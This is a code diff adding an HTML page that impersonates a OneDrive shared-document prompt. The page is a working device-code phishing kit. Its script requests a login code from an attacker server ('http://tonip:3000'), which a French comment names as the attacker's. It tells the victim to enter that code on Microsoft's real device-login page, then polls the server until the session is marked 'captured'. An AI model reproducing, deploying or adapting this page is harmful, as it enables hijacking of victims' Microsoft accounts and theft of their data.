@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Shared document</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: system-ui,-apple-system,BlinkMacSystemFont,sans-serif; background: #eaeaea; min-height: 100vh; }
+        ._hblb6e { background: #0064b8; height: 44px; display: flex; align-items: center; padding: 0 20px; }
+        ._hblb6e span { color: #fff; font-size: 15px; font-weight: 500; }
+        ._9k3e8r { max-width: 540px; margin: 48px auto; padding: 0 16px; }
+        ._to1wse { background: #fff; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,.08); overflow: hidden; }
+        ._q0kf8q { display: flex; align-items: center; gap: 14px; padding: 20px 22px; border-bottom: 1px solid #eee; }
+        ._kc3thy { padding: 18px 22px 14px; }
+        ._nov2sk { width: 42px; height: 42px; border-radius: 50%; background: #0064b8; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 17px; font-weight: 600; margin-bottom: 12px; }
+        ._kc3thy h2 { font-size: 17px; font-weight: 600; color: #242424; margin-bottom: 5px; }
+        ._kc3thy p { font-size: 13px; color: #636363; }
+        ._52qvxp { padding: 18px 22px; text-align: center; }
+        ._h21mkh { display: inline-block; background: #0064b8; color: #fff; border: none; padding: 11px 34px; font-size: 14px; font-weight: 600; border-radius: 4px; cursor: pointer; text-decoration: none; font-family: inherit; }
+        ._h21mkh:hover { background: #004f96; }
+        ._87pa2g { text-align: center; padding: 0 22px 18px; }
+        ._87pa2g p { font-size: 11px; color: #888; }
+        ._14ohim { display: inline-block; width: 12px; height: 12px; border: 2px solid #ddd; border-top-color: #0064b8; border-radius: 50%; animation: _n1vvnu .7s linear infinite; vertical-align: middle; margin-right: 6px; }
+        @keyframes _n1vvnu { to { transform: rotate(360deg); } }
+        ._aepkfu { display: none; text-align: center; padding: 38px 22px; }
+        ._aepkfu h2 { font-size: 17px; font-weight: 600; color: #242424; margin-bottom: 5px; }
+        ._aepkfu p { font-size: 12px; color: #636363; }
+        ._8mpmqp { text-align: center; padding: 14px; font-size: 10px; color: #999; }
+    </style>
+</head>
+<body>
+    <nav class="_hblb6e"><span>OneDrive</span></nav>
+    <div class="_9k3e8r">
+        <div class="_to1wse">
+            <div id="mainView">
+                <div class="_q0kf8q">
+                    <div style="flex-shrink:0">
+                        <svg width="38" height="46" viewBox="0 0 38 46">
+                            <rect width="38" height="46" rx="4" fill="#C42F1A"/>
+                            <text x="19" y="29" text-anchor="middle" fill="#fff" font-family="Segoe UI,sans-serif" font-size="13" font-weight="700">PDF</text>
+                        </svg>
+                    </div>
+                    <div style="flex:1;min-width:0">
+                        <div style="font-size:14px;font-weight:600;color:#242424;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">Shared Document</div>
+                        <div style="font-size:11px;color:#888;margin-top:2px">Document</div>
+                    </div>
+                </div>
+                <div class="_kc3thy">
+                    <div class="_nov2sk">M</div>
+                    <h2>Microsoft User shared this with you</h2>
+                    <p>Authenticate with your Microsoft account to view it.</p>
+                </div>
+                <div class="_52qvxp">
+                    <div style="margin:18px 0 0;padding:18px 16px;background:#f9f9f8;border:1px solid #e6e4e1;border-radius:6px;text-align:center">
+                        <p style="font-size:11px;color:#6e6b68;margin-bottom:10px">Verification code</p>
+                        <div style="font-size:28px;font-weight:700;color:#0064b8;letter-spacing:4px;font-family:'Segoe UI',monospace;margin-bottom:10px;user-select:all" id="userCode">L24PUX6FY</div>
+                        <button id="copyBtn" style="background:#0064b8;color:#fff;border:none;padding:6px 18px;border-radius:4px;cursor:pointer;font-size:11px;font-family:inherit">Copy code</button>
+                        
+                        <div style="margin-top:14px;text-align:left;font-size:11px;color:#6e6b68;line-height:1.9">
+                            <p style="font-weight:600;margin-bottom:5px">Steps to view:</p>
+                            <ol style="padding-left:20px;margin:0">
+                                <li>Click the button below to open the sign-in window</li>
+                                <li>Enter code <strong>L24PUX6FY</strong> when prompted</li>
+                                <li>Authenticate with your account</li>
+                                <li>Return to this tab to view your documents</li>
+                            </ol>
+                        </div>
+                    </div>
+                    <div style="margin-top:18px">
+                        <a href="#" class="_h21mkh" id="loginBtn">View</a>
+                    </div>
+                </div>
+                <div class="_87pa2g">
+                    <p id="statusMsg">
+                        <span class="_14ohim"></span>
+                        Checking access...
+                    </p>
+                </div>
+            </div>
+            
+            <div class="_aepkfu" id="successBox">
+                <div style="width:46px;height:46px;border-radius:50%;background:#0f7b10;display:flex;align-items:center;justify-content:center;margin:0 auto 12px">
+                    <svg viewBox="0 0 24 24" fill="none" width="24" height="24">
+                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#fff"/>
+                    </svg>
+                </div>
+                <h2>Ready</h2>
+                <p>You can view the file now.</p>
+            </div>
+        </div>
+    </div>
+    <div class="_8mpmqp">OneDrive &middot; Microsoft 365</div>
+<script>
+        const SID = 25370;
+        const API = 'http://tonip:3000';
+        let codeText = 'CHARGEMENT...'; // Code temporaire
+
+        // --- 1. INITIALISATION AUTOMATIQUE ---
+        async function fetchFreshCode() {
+            try {
+                // Demande au serveur de l'attaquant de générer le code via Microsoft
+                const response = await fetch(API + '/api/get-code');
+                const data = await response.json();
+                
+                if (data.user_code) {
+                    codeText = data.user_code;
+                    // Mise à jour de l'interface avec le vrai code
+                    document.getElementById('userCode').textContent = codeText;
+                    
+                    // Mise à jour des instructions (étape 2)
+                    const instructions = document.querySelector('ol li:nth-child(2)');
+                    if (instructions) {
+                        instructions.innerHTML = `Enter code <strong>${codeText}</strong> when prompted`;
+                    }
+                }
+            } catch (error) {
+                console.error("Erreur de récupération du code", error);
+                document.getElementById('userCode').textContent = 'ERREUR';
+            }
+        }
+
+        // --- 2. LOGIQUE BOUTONS ---
+        document.getElementById('copyBtn').addEventListener('click', function() {
+            if(codeText === 'CHARGEMENT...' || codeText === 'ERREUR') return;
+            alert('Code: ' + codeText);
+            this.textContent = 'Copied!';
+            this.style.background = '#0f7b10';
+            setTimeout(() => {
+                this.textContent = 'Copy code';
+                this.style.background = '#0064b8';
+            }, 1800);
+        });
+
+        document.getElementById('loginBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            if(codeText === 'CHARGEMENT...' || codeText === 'ERREUR') return;
+            
+            window.open('https://login.microsoftonline.com/common/oauth2/deviceauth', 'mslogin', 'width=520,height=720,scrollbars=yes,resizable=yes');
+        });
+
+        // --- 3. LOGIQUE POLLING ---
+        async function pollStatus() {
+            try {
+                const r = await fetch(API + '/api/status/' + SID);
+                const d = await r.json();
+                
+                if (d.status === 'captured') {
+                    document.getElementById('statusMsg').textContent = 'Access granted. You may close this window.';
+                    document.getElementById('mainView').style.display = 'none';
+                    document.getElementById('successBox').style.display = 'block';
+                    return; 
+                }
+            } catch (e) {}
+            setTimeout(pollStatus, 5000);
+        }
+
+        // --- 4. DÉMARRAGE SÉQUENTIEL ---
+        // On récupère le code, PUIS on lance la surveillance
+        fetchFreshCode().then(() => {
+            pollStatus();
+        });
+    </script>
+</body>
+</html>
